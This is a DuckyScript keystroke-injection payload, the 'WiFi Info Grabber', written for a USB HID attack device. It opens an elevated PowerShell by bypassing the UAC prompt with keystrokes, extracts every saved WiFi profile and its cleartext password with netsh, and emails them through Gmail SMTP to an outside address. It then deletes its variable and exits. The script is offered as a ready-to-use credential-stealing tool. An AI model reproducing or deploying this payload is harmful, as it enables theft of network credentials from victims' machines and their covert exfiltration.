REM Title: WiFi Info Grabber
REM Author: CoolJoe72
REM Version: 1
REM Description: Grabs WiFi profiles and passwords then emails it to your gmail account.

ESCAPE
CONTROL ESCAPE
DELAY 400
STRING powershell
DELAY 400
CTRL-SHIFT ENTER
DELAY 400
ALT y

STRING cd $env:temp
ENTER

STRING $A = (netsh wlan show pro) | sls "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show pro name="$name" key=clear)}  | sls "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize


STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi Grabber'
ENTER
STRING $ReportEmail.Body = $A
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
STRING rm variable:/A
ENTER
STRING exit
ENTER

REM exit
STRING exit
ENTER
